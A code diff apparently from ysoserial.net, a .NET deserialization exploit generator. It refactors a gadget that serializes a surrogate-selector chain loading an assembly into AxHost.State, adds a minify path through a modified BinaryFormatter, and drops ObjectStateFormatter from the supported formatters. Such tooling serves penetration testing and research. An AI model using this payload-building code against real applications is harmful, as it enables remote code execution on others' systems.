@@ -35,10 +35,12 @@ namespace ysoserial.Generators
     {
         protected byte[] assemblyBytes;
         private int variant_number = 1;
-        public PayloadClass() : this(1) { }
-        public PayloadClass(int variant_number)
+        private InputArgs inputArgs = new InputArgs();
+        public PayloadClass() : this(1, new InputArgs()) { }
+        public PayloadClass(int variant_number, InputArgs inputArgs)
         {
             this.variant_number = variant_number;
+            this.inputArgs = inputArgs;
             this.assemblyBytes = File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "e.dll"));
         }
         private IEnumerable<TResult> CreateWhereSelectEnumerableIterator<TSource, TResult>(IEnumerable<TSource> src, Func<TSource, bool> predicate, Func<TSource, TResult> selector)
@@ -213,10 +215,21 @@ namespace ysoserial.Generators
             // https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.axhost.state
             // vs
             // https://docs.microsoft.com/en-us/dotnet/api/system.data.dataset
-            BinaryFormatter fmt = new BinaryFormatter();
             MemoryStream stm = new MemoryStream();
-            fmt.SurrogateSelector = new MySurrogateSelector();
-            fmt.Serialize(stm, ls);
+
+            if (inputArgs.Minify)
+            {
+                ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = new ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();
+                fmtLocal.SurrogateSelector = new MySurrogateSelector();
+                fmtLocal.Serialize(stm, ls);
+            }
+            else
+            {
+                BinaryFormatter fmt = new BinaryFormatter();
+                fmt.SurrogateSelector = new MySurrogateSelector();
+                fmt.Serialize(stm, ls);
+            }
+            
             info.SetType(typeof(System.Windows.Forms.AxHost.State));
             info.AddValue("PropertyBagBinary", stm.ToArray());
             //*/
@@ -242,7 +255,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter (2)", "ObjectStateFormatter", "SoapFormatter", "LosFormatter" };
+            return new List<string> { "BinaryFormatter (2)", "SoapFormatter", "LosFormatter" };
         }
 
         public override string Name()
@@ -267,7 +280,7 @@ namespace ysoserial.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            PayloadClass payload = new PayloadClass(variant_number);
+            PayloadClass payload = new PayloadClass(variant_number, inputArgs);
             return Serialize(payload, formatter, inputArgs);
         }
 
